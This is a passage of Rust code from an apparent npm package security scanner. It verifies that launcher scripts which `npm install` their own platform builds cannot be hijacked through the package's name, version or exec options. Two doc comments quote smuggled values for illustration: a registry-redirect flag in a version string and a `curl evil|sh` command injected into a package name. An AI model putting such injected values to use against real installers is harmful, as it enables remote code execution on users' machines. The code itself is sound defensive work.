        ["rimraf", paths @ ..] if rels(paths, 1) => Some(Some("rimraf")),
        _ => None,
    }
}

// ---------------------------------------------------------------------------
// CODE-016: a launcher that installs its own platform package
// ---------------------------------------------------------------------------

/// `npm install` flags that change nothing about what is installed or where
/// it comes from.
const INSTALL_FLAGS: &[&str] = &[
    "no-save",
    "no-audit",
    "no-fund",
    "prefer-online",
    "prefer-offline",
    "no-package-lock",
    "no-progress",
    "silent",
    "quiet",
];

fn classify_launcher_line(tree: &mut Tree<'_>, rel: &str, line_no: usize) -> Option<Rewrite> {
    let text = tree.read(rel)?;
    if text.len() > MAX_LAUNCHER_BYTES {
        return None;
    }
    let manifest_rel = nearest_manifest(tree, rel)?;
    tree.load_manifest(&manifest_rel);
    let m = tree.manifest(&manifest_rel)?;
    let own = own_platform_packages(m)?;
    if !is_bin_target(m, rel) {
        return None;
    }
    let src = Source::new(&text)?;
    // `with` and a direct `eval` can put a binding in scope that no
    // declaration shows, which is the one thing the resolution below trusts.
    if re!(r"\b(?:with|eval)\s*\(")
        .find_iter(&text)
        .any(|m| src.is_code(m.start()))
    {
        return None;
    }
    let line_start = src.line_start(line_no)?;
    let line_end = text[line_start..]
        .find('\n')
        .map_or(text.len(), |i| line_start + i);
    let line = &text[line_start..line_end];
    let call = launcher_call(&src, m, rel, line_start, line_end)?;
    Some(Rewrite {
        rule: RULE_LAUNCHER,
        severity: Severity::Medium,
        title: TITLE_LAUNCHER,
        line: line.to_string(),
        reason: format!(
            "installs {}-<platform>-<arch>@{} ({} platform packages declared at that version){call}",
            m.doc.get("name")?.as_str()?,
            m.doc.get("version")?.as_str()?,
            own
        ),
    })
}

/// The closest `package.json` at or above the file's directory.
fn nearest_manifest(tree: &Tree<'_>, rel: &str) -> Option<String> {
    let mut dir = split_rel(rel).0.to_string();
    loop {
        let candidate = if dir.is_empty() {
            "package.json".to_string()
        } else {
            format!("{dir}/package.json")
        };
        if tree.present.contains(&candidate) {
            return Some(candidate);
        }
        if dir.is_empty() {
            return None;
        }
        dir = split_rel(&dir).0.to_string();
    }
}

/// A strict semver version as an npm launcher interpolates it into
/// `npm install <name>@<version>`: `MAJOR.MINOR.PATCH` with an optional
/// `-prerelease` and `+build`, nothing else. It exists to reject a `version`
/// field that carries a smuggled flag or shell metacharacter
/// (`"1.4.0 --registry=https://evil.example.com"`), which npm's publish-time
/// validation does not protect against on a cloned, tarball or local install
/// (Codex second review of #172, hunt finding H1). The pre-release and build
/// identifiers are ASCII alphanumerics and hyphens in dot-separated parts, so
/// no whitespace or shell-significant character can appear.
fn is_strict_semver(v: &str) -> bool {
    fn part_dot_ident(s: &str, allow_leading_zero: bool) -> bool {
        !s.is_empty()
            && s.split('.').all(|id| {
                !id.is_empty()
                    && id.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-')
                    && (allow_leading_zero
                        || id.bytes().any(|b| !b.is_ascii_digit())
                        || id == "0"
                        || !id.starts_with('0'))
            })
    }
    // Split off build metadata (`+...`) then pre-release (`-...`).
    let (core_pre, build) = match v.split_once('+') {
        Some((cp, b)) => (cp, Some(b)),
        None => (v, None),
    };
    if build.is_some_and(|b| !part_dot_ident(b, true)) {
        return false;
    }
    let (core, pre) = match core_pre.split_once('-') {
        Some((c, p)) => (c, Some(p)),
        None => (core_pre, None),
    };
    if pre.is_some_and(|p| !part_dot_ident(p, false)) {
        return false;
    }
    let nums: Vec<&str> = core.split('.').collect();
    nums.len() == 3
        && nums.iter().all(|n| {
            !n.is_empty()
                && n.bytes().all(|b| b.is_ascii_digit())
                && (*n == "0" || !n.starts_with('0'))
        })
}

/// A valid npm package name token as an npm launcher interpolates it into a
/// shell `npm install`: an optional `@scope/` then a name of lowercase
/// alphanumerics and `._-`. No whitespace, no shell metacharacter, so an
/// injected `name` field (`"acme;curl evil|sh"`) cannot ride the launcher's
/// `execSync` (hunt finding H1).
fn is_npm_name(name: &str) -> bool {
    fn segment(s: &str) -> bool {
        !s.is_empty()
            && s.len() <= 214
            && s.bytes().all(|b| {
                b.is_ascii_lowercase() || b.is_ascii_digit() || matches!(b, b'.' | b'_' | b'-')
            })
            && !s.starts_with(['.', '_'])
    }
    match name.strip_prefix('@') {
        Some(scoped) => match scoped.split_once('/') {
            Some((scope, rest)) => segment(scope) && segment(rest),
            None => false,
        },
        None => segment(name),
    }
}

/// How many `<name>-<os>-<cpu>` optional dependencies the manifest declares,
/// when there are at least two and every one is pinned to its own version.
/// Both the name and the version are interpolated into the launcher's
/// `execSync(`npm install ...`)`, so both must be safe tokens (a strict
/// semver, a valid package name); otherwise the launcher keeps CODE-014 High
/// rather than being downgraded to CODE-016 (hunt finding H1).
fn own_platform_packages(m: &Manifest) -> Option<usize> {
    let name = m.doc.get("name")?.as_str()?;
    let version = m.doc.get("version")?.as_str()?;
    if !is_npm_name(name) || !is_strict_semver(version) {
        return None;
    }
    let optional = m.doc.get("optionalDependencies")?.as_object()?;
    let shape = Regex::new(&format!(
        "^{}-(?:linux|darwin|win32|freebsd)-(?:x64|arm64|ia32|arm)$",
        regex::escape(name)
    ))
    .ok()?;
    let mut n = 0;
    for (k, v) in optional {
        if shape.is_match(k) {
            if v.as_str() != Some(version) {
                return None;
            }
            n += 1;
        }
    }
    (n >= 2).then_some(n)
}

fn is_bin_target(m: &Manifest, rel: &str) -> bool {
    let targets: Vec<&str> = match m.doc.get("bin") {
        Some(Value::String(s)) => vec![s.as_str()],
        Some(Value::Object(o)) => o.values().filter_map(Value::as_str).collect(),
        _ => Vec::new(),
    };
    targets
        .iter()
        .filter_map(|t| resolve_under(&m.dir, &m.dir, t))
        .any(|t| t == rel)
}

/// What an expression in the launcher is known to be.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Sym {
    /// `require('./package.json')` of the launcher's own manifest.
    Manifest,
    /// The `os` module.
    Os,
    OwnName,
    OwnVersion,
    Platform,
    Arch,
}

/// The launcher's `execSync` call on this line, when it installs the
/// package's own platform build. Returns a note on the command form.
fn launcher_call(
    src: &Source<'_>,
    m: &Manifest,
    rel: &str,
    line_start: usize,
    line_end: usize,
) -> Option<String> {
    let text = src.text;
    let line = &text[line_start..line_end];
    if line.matches("execSync").count() != 1 {
        return None;
    }
    let call = line.find("execSync")?;
    // The call starts the statement: nothing else on the line before it
    // that the line rule could also have been reporting.
    if !re!(r"^\s*(?:(?:const|let|var)\s+[A-Za-z_$][\w$]*\s*=\s*)?(?:[A-Za-z_$][\w$]*\s*\.\s*)?$")
        .is_match(&line[..call])
    {
        return None;
    }
    let open = line_start + call + "execSync".len();
    let after = text[open..].strip_prefix('(')?;
    let arg_start = open + 1 + (after.len() - after.trim_start().len());
    if text.as_bytes().get(arg_start) != Some(&b'`') {
        return None;
    }
    let arg_end = arg_start + 1 + text[arg_start + 1..].find('`')?;
    if arg_end > line_end {
        return None;
    }
    let template = &text[arg_start + 1..arg_end];
    // Nothing else on the line: the options object (or nothing) and the end
    // of the statement.
    let rest = text[arg_end + 1..line_end].trim();
    let options_ok = match rest {
        ")" | ");" => true,
        _ => {
            let r = rest.strip_prefix(',')?.trim();
            if r == "{" {
                let brace = arg_end + 1 + text[arg_end + 1..].find('{')?;
                src.safe_options_at(brace)
            } else {
                let c = re!(r"^([A-Za-z_$][\w$]*)\s*\)\s*;?$").captures(r)?;
                let (at, rhs) = src.single_const(&c[1], arg_end)?;
                rhs.starts_with('{') && src.safe_options_at(at)
            }
        }
    };
    if !options_ok {
        return None;
    }

    let command = if let Some(c) =
        re!(r"^\$\{\s*([A-Za-z_$][\w$]*)\s*\}((?: --[a-z][a-z-]*)*)$").captures(template)
    {
        if !flags_ok(&c[2]) {
            return None;
        }
        let (at, rhs) = src.single_const(&c[1], arg_start)?;
        let inner = rhs.strip_prefix('`')?.strip_suffix('`')?;
        install_command(src, m, rel, inner, at)?;
        "via a single-assignment command constant"
    } else {
        install_command(src, m, rel, template, arg_start)?;
        "inline command"
    };
    Some(format!("; {command}"))
}

/// `npm install ${X}@${Y}` followed by allowlisted flags, where X is a
/// single-assignment constant holding `${own name}-${platform}-${arch}` and
/// Y is the package's own version.
fn install_command(
    src: &Source<'_>,
    m: &Manifest,
    rel: &str,
    template: &str,
    use_at: usize,
) -> Option<()> {
    let c = re!(r"^npm install \$\{\s*([A-Za-z_$][\w$]*)\s*\}@\$\{([^}]+)\}((?: [a-z.-]+)*)$")
        .captures(template)?;
    if !flags_ok(&c[3]) || src.symbol_of(&c[2], use_at, m, rel, 0)? != Sym::OwnVersion {
        return None;
    }
    let (at, rhs) = src.single_const(&c[1], use_at)?;
    let inner = rhs.strip_prefix('`')?.strip_suffix('`')?;
    let p = re!(r"^\$\{([^}]+)\}-\$\{([^}]+)\}-\$\{([^}]+)\}$").captures(inner)?;
    let parts = [
        src.symbol_of(&p[1], at, m, rel, 0)?,
        src.symbol_of(&p[2], at, m, rel, 0)?,
        src.symbol_of(&p[3], at, m, rel, 0)?,
    ];
    (parts == [Sym::OwnName, Sym::Platform, Sym::Arch]).then_some(())
}

/// Space-separated `npm install` flags: allowlisted `--flags` and one
/// `--prefix .`, nothing with a value.
fn flags_ok(flags: &str) -> bool {
    let tokens: Vec<&str> = flags.split_whitespace().collect();
    let mut i = 0;
    let mut prefix_seen = false;
    while i < tokens.len() {
        let t = tokens[i];
        if t == "--prefix" && tokens.get(i + 1) == Some(&".") && !prefix_seen {
            prefix_seen = true;
            i += 2;
            continue;
        }
        match t.strip_prefix("--") {
            Some(f) if INSTALL_FLAGS.contains(&f) => i += 1,
            _ => return false,
        }
    }
    true
}

// ---------------------------------------------------------------------------
// A little lexical view of a launcher script
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Class {
    Code,
    Str,
    Comment,
    Template,
}

/// The script text with each byte classified as code, string, comment or
/// template-literal text (a `${...}` substitution is code), and the matching
/// bracket of every bracket in code.
pub(crate) struct Source<'a> {
    text: &'a str,
    class: Vec<Class>,
    /// For every code byte, the innermost enclosing `{` (position), if any.
    block: Vec<Option<usize>>,
    close: HashMap<usize, usize>,
}

impl<'a> Source<'a> {
    pub(crate) fn new(text: &'a str) -> Option<Self> {
        let class = lex(text)?;
        let b = text.as_bytes();
        let mut block = vec![None; b.len()];
        let mut close = HashMap::new();
        let mut stack: Vec<(u8, usize)> = Vec::new();
        for i in 0..b.len() {
            block[i] = stack
                .iter()
                .rev()
                .find(|(c, _)| *c == b'{')
                .map(|(_, p)| *p);
            if class[i] != Class::Code {
                continue;
            }
            match b[i] {
                b'{' | b'(' | b'[' => stack.push((b[i], i)),
                b'}' | b')' | b']' => {
                    let want = match b[i] {
                        b'}' => b'{',
                        b')' => b'(',
                        _ => b'[',
                    };
                    let (c, p) = stack.pop()?;
                    if c != want {
                        return None;
                    }
                    close.insert(p, i);
                }
                _ => {}
            }
        }
        stack.is_empty().then_some(Source {
            text,
            class,
            block,
            close,
        })
    }

    fn line_start(&self, line_no: usize) -> Option<usize> {
        if line_no == 1 {
            return Some(0);
        }
        self.text
            .match_indices('\n')
            .nth(line_no.checked_sub(2)?)
            .map(|(i, _)| i + 1)
    }

    fn is_code(&self, at: usize) -> bool {
        self.class.get(at) == Some(&Class::Code)
    }

    /// Previous non-whitespace code byte before `at`.
    fn prev_sig(&self, at: usize) -> Option<(usize, u8)> {
        let b = self.text.as_bytes();
        (0..at)
            .rev()
            .find(|&i| !b[i].is_ascii_whitespace())
            .map(|i| (i, b[i]))
    }

    /// The single `const NAME = <rhs>` binding that is in scope at `use_at`:
    /// NAME has exactly one declaration in the file, it is `const`, the use
    /// is after it and inside the block that declares it, and no occurrence
    /// of NAME anywhere is an assignment, an increment, or a parameter,
    /// catch, function, class, import or destructuring binding. Returns the
    /// position and text of the right-hand side.
    pub(crate) fn single_const(&self, name: &str, use_at: usize) -> Option<(usize, &'a str)> {
        let text = self.text;
        let b = text.as_bytes();
        let word = Regex::new(&format!(r"(?:^|[^\w$]){}(?:[^\w$]|$)", regex::escape(name))).ok()?;
        let mut decl: Option<usize> = None;
        let mut search = 0;
        while let Some(m) = word.find_at(text, search) {
            let mut at = m.start();
            while !text[at..].starts_with(name) {
                at += 1;
            }
            search = at + name.len();
            if !self.is_code(at) {
                continue;
            }
            let after = &text[at + name.len()..];
            let prev = self.prev_sig(at);
            // A property of something else (`obj.NAME`, `obj?.NAME`), but not
            // a rest element (`...NAME`), which can bind.
            if prev.is_some_and(|(i, c)| c == b'.' && !(i >= 2 && &text[i - 2..=i] == "...")) {
                continue;
            }
            let before = &text[..at];
            if re!(r"\b(?:const|let|var)\s+$").is_match(before) {
                if decl.is_some()
                    || !before.trim_end().ends_with("const")
                    || !re!(r"^\s*=(?:[^=>]|$)").is_match(after)
                {
                    return None;
                }
                decl = Some(at);
                continue;
            }
            if re!(r"\b(?:function|class|import|catch)\s*\(?\s*$").is_match(before)
                || re!(r"^\s*(?:[-+*/%&|^]|\*\*|<<|>>>?|&&|\|\||\?\?)?=(?:[^=>]|$)").is_match(after)
                || re!(r"^\s*(?:\+\+|--)").is_match(after)
                || re!(r"(?:\+\+|--)\s*$").is_match(before)
                || re!(r"^\s*=>").is_match(after)
            {
                return None;
            }
            if self.binds_in_groups(name, at)? {
                return None;
            }
        }
        let decl = decl?;
        if decl >= use_at {
            return None;
        }
        // A `for (const NAME = ...;;)` header scopes NAME to the loop.
        if self
            .enclosing_group(decl)
            .is_some_and(|open| b[open] != b'{')
        {
            return None;
        }
        // Scope: the declaring block must enclose the use.
        if let Some(open) = self.block[decl] {
            let close = *self.close.get(&open)?;
            if !(open < use_at && use_at < close) {
                return None;
            }
        }
        let eq = decl + name.len() + text[decl + name.len()..].find('=')?;
        let rhs_start = eq + 1 + (text[eq + 1..].len() - text[eq + 1..].trim_start().len());
        let rhs_end = self.statement_end(rhs_start)?;
        Some((rhs_start, text[rhs_start..rhs_end].trim_end()))
    }

    /// Whether the occurrence of `name` at `at` sits in a binding position:
    /// a parameter list (`(a, NAME) =>`, `function f({ x: NAME }) {`), a
    /// destructuring pattern (`{ NAME } = obj`, `[NAME] = arr`, at any
    /// nesting depth) or a `for (NAME of xs)` head. Walks the enclosing
    /// bracket groups outward until the statement block that holds the
    /// occurrence. `None` when the bracket structure cannot be read.
    fn binds_in_groups(&self, name: &str, at: usize) -> Option<bool> {
        let text = self.text;
        let b = text.as_bytes();
        let for_of = Regex::new(&format!(
            r"^\s*(?:(?:const|let|var)\s+)?{}\s+(?:of|in)\b",
            regex::escape(name)
        ))
        .ok()?;
        let mut inner_of = at;
        while let Some(open) = self.enclosing_group(inner_of) {
            let close = *self.close.get(&open)?;
            let tail = text[close + 1..].trim_start();
            let head = text[..open].trim_end();
            let keyword = head
                .rsplit(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '$'))
                .next()
                .unwrap_or("");
            if tail.starts_with("=>") || (b[open] != b'(' && re!(r"^=(?:[^=>]|$)").is_match(tail)) {
                return Some(true);
            }
            match b[open] {
                b'(' => {
                    let inner = &text[open + 1..close];
                    if keyword == "for" && for_of.is_match(inner) {
                        return Some(true);
                    }
                    // `(...) {` is a condition after if/while/switch/for,
                    // and a parameter list after anything else.
                    if tail.starts_with('{')
                        && !matches!(keyword, "if" | "while" | "switch" | "for")
                    {
                        return Some(true);
                    }
                }
                b'{' => {
                    // A statement block ends the walk: what encloses it
                    // cannot make this occurrence a binding.
                    let block = head.is_empty()
                        || head.ends_with([')', ';', '{', '}'])
                        || head.ends_with("=>")
                        || matches!(keyword, "else" | "try" | "finally" | "do");
                    if block {
                        return Some(false);
                    }
                }
                _ => {}
            }
            inner_of = open;
        }
        Some(false)
    }

    /// The innermost bracket (any kind) enclosing `at`, in code.
    fn enclosing_group(&self, at: usize) -> Option<usize> {
        self.close
            .iter()
            .filter(|(&open, &close)| open < at && at < close)
            .max_by_key(|(&open, _)| open)
            .map(|(&open, _)| open)
    }

    /// End of the expression starting at `start`: a template literal or a
    /// bracketed literal ends at its close, anything else at the end of the
    /// line or a `;`.
    fn statement_end(&self, start: usize) -> Option<usize> {
        let b = self.text.as_bytes();
        match b.get(start)? {
            b'`' => {
                let end = start + 1 + self.text[start + 1..].find('`')?;
                Some(end + 1)
            }
            b'{' | b'[' | b'(' => self.close.get(&start).map(|c| c + 1),
            _ => {
                let line_end = self.text[start..].find('\n').map_or(b.len(), |i| start + i);
                let semi = self.text[start..line_end].find(';').map(|i| start + i);
                Some(semi.unwrap_or(line_end))
            }
        }
    }

    /// An `execSync` options object at `open` (`{`) that cannot change what
    /// the command runs: no `env`, `shell`, `argv0`, `uid` or `gid`, and no
    /// spread of another object.
    fn safe_options_at(&self, open: usize) -> bool {
        let Some(&close) = self.close.get(&open) else {
            return false;
        };
        let body = &self.text[open..=close];
        !body.contains("...") && !re!(r"\b(?:env|shell|argv0|uid|gid)\b").is_match(body)
    }

    /// What `expr` is known to be at `use_at`.
    fn symbol_of(
        &self,
        expr: &str,
        use_at: usize,
        m: &Manifest,
        rel: &str,
        depth: usize,
    ) -> Option<Sym> {
        if depth > 4 {
            return None;
        }
        let expr = expr.trim().trim_end_matches(';').trim();
        if re!(r"^[A-Za-z_$][\w$]*$").is_match(expr) {
            let (at, rhs) = self.single_const(expr, use_at)?;
            return self.symbol_of(rhs, at, m, rel, depth + 1);
        }
        if let Some(c) =
            re!(r#"^require\(\s*(['"])(\.{1,2}/[A-Za-z0-9_./-]*package\.json)(['"])\s*\)$"#)
                .captures(expr)
        {
            let target = resolve_under(&m.dir, split_rel(rel).0, &c[2])?;
            return (c[1] == c[3] && target == m.rel).then_some(Sym::Manifest);
        }
        if re!(r#"^require\(\s*'(?:node:)?os'\s*\)$|^require\(\s*"(?:node:)?os"\s*\)$"#)
            .is_match(expr)
        {
            return Some(Sym::Os);
        }
        match expr {
            "process.platform" => return Some(Sym::Platform),
            "process.arch" => return Some(Sym::Arch),
            _ => {}
        }
        if let Some(c) = re!(r"^([A-Za-z_$][\w$]*)\s*\.\s*(name|version)$").captures(expr) {
            if self.symbol_of(&c[1], use_at, m, rel, depth + 1)? == Sym::Manifest {
                return Some(if &c[2] == "name" {
                    Sym::OwnName
                } else {
                    Sym::OwnVersion
                });
            }
            return None;
        }
        if let Some(c) = re!(r"^([A-Za-z_$][\w$]*)\s*\.\s*(platform|arch)\(\)$").captures(expr) {
            if self.symbol_of(&c[1], use_at, m, rel, depth + 1)? == Sym::Os {
                return Some(if &c[2] == "platform" {
                    Sym::Platform
                } else {
                    Sym::Arch
                });
            }
        }
        None
    }
}

/// Classify every byte of a JavaScript source as code, string, comment or
/// template text. `None` when the text does not lex (an unterminated string,
/// comment or template), in which case nothing about it is trusted.
fn lex(text: &str) -> Option<Vec<Class>> {
    let b = text.as_bytes();
    let n = b.len();
    let mut class = vec![Class::Code; n];
    // One entry per open `${`: the `{` depth inside that substitution.
    let mut subs: Vec<usize> = Vec::new();
    let mut i = 0;
    let mut last_sig: u8 = b'\n';
    let mut last_word = String::new();
    // A `#!` interpreter line is a comment to the runtime.
    if text.starts_with("#!") {
        while i < n && b[i] != b'\n' {
            class[i] = Class::Comment;
            i += 1;
        }
    }

    // Scan template text from `i` (just after a backtick or a closing
    // substitution brace) to the closing backtick or the next `${`.
    fn template_text(
        b: &[u8],
        class: &mut [Class],
        mut i: usize,
        subs: &mut Vec<usize>,
    ) -> Option<usize> {
        while i < b.len() {
            match b[i] {
                b'\\' => {
                    class[i] = Class::Template;
                    if i + 1 < b.len() {
                        class[i + 1] = Class::Template;
                    }
                    i += 2;
                }
                b'`' => {
                    class[i] = Class::Str;
                    return Some(i + 1);
                }
                b'$' if b.get(i + 1) == Some(&b'{') => {
                    // `${` itself is code; the substitution follows.
                    subs.push(0);
                    return Some(i + 2);
                }
                _ => {
                    class[i] = Class::Template;
                    i += 1;
                }
            }
        }
        None
    }

    while i < n {
        let c = b[i];
        match c {
            b'/' if b.get(i + 1) == Some(&b'/') => {
                while i < n && b[i] != b'\n' {
                    class[i] = Class::Comment;
                    i += 1;
                }
            }
            b'/' if b.get(i + 1) == Some(&b'*') => {
                let end = text[i + 2..].find("*/")? + i + 4;
                for k in class.iter_mut().take(end).skip(i) {
                    *k = Class::Comment;
                }
                i = end;
            }
            b'\'' | b'"' => {
                class[i] = Class::Str;
                i += 1;
                loop {
                    let ch = *b.get(i)?;
                    class[i] = Class::Str;
                    match ch {
                        b'\\' => {
                            if i + 1 < n {
                                class[i + 1] = Class::Str;
                            }
                            i += 2;
                        }
                        b'\n' => return None,
                        _ if ch == c => {
                            i += 1;
                            break;
                        }
                        _ => i += 1,
                    }
                }
                last_sig = c;
            }
            b'`' => {
                class[i] = Class::Str;
                i = template_text(b, &mut class, i + 1, &mut subs)?;
                last_sig = b'`';
            }
            b'/' if regex_can_start(last_sig, &last_word) => {
                class[i] = Class::Str;
                i += 1;
                let mut in_class = false;
                loop {
                    let ch = *b.get(i)?;
                    class[i] = Class::Str;
                    match ch {
                        b'\\' => {
                            if i + 1 < n {
                                class[i + 1] = Class::Str;
                            }
                            i += 2;
                            continue;
                        }
                        b'\n' => return None,
                        b'[' => in_class = true,
                        b']' => in_class = false,
                        b'/' if !in_class => {
                            i += 1;
                            break;
                        }
                        _ => {}
                    }
                    i += 1;
                }
                while i < n && b[i].is_ascii_alphabetic() {
                    class[i] = Class::Str;
                    i += 1;
                }
                last_sig = b'/';
            }
            b'{' if !subs.is_empty() => {
                *subs.last_mut()? += 1;
                last_sig = c;
                i += 1;
            }
            b'}' if !subs.is_empty() => {
                if *subs.last()? == 0 {
                    subs.pop();
                    i = template_text(b, &mut class, i + 1, &mut subs)?;
                    last_sig = b'`';
                } else {
                    *subs.last_mut()? -= 1;
                    last_sig = c;
                    i += 1;
                }
            }
            _ => {
                if c.is_ascii_alphanumeric() || c == b'_' || c == b'$' {
                    let start = i;
                    while i < n && (b[i].is_ascii_alphanumeric() || b[i] == b'_' || b[i] == b'$') {
                        i += 1;
                    }
                    last_word = text[start..i].to_string();
                    last_sig = b'a';
                    continue;
                }
                if !c.is_ascii_whitespace() {
                    last_sig = c;
                    last_word.clear();
                }
                i += 1;
            }
        }
    }
    subs.is_empty().then_some(class)
}

/// Whether a `/` after this token starts a regular-expression literal
/// rather than a division.
fn regex_can_start(last_sig: u8, last_word: &str) -> bool {
    if last_sig == b'a' {
        return matches!(
            last_word,
            "return"
                | "typeof"
                | "case"
                | "do"
                | "else"
                | "in"
                | "of"
                | "new"
                | "delete"
                | "void"
                | "throw"
                | "yield"
                | "await"
        );
    }
    matches!(
        last_sig,
        b'\n'
            | b'('
            | b','
            | b'='
            | b':'
            | b'['
            | b'!'
            | b'&'
            | b'|'
            | b'?'
            | b'{'
            | b'}'
            | b';'
            | b'+'
            | b'-'
            | b'*'
            | b'%'
            | b'<'
            | b'>'
            | b'~'
            | b'^'
    )
}
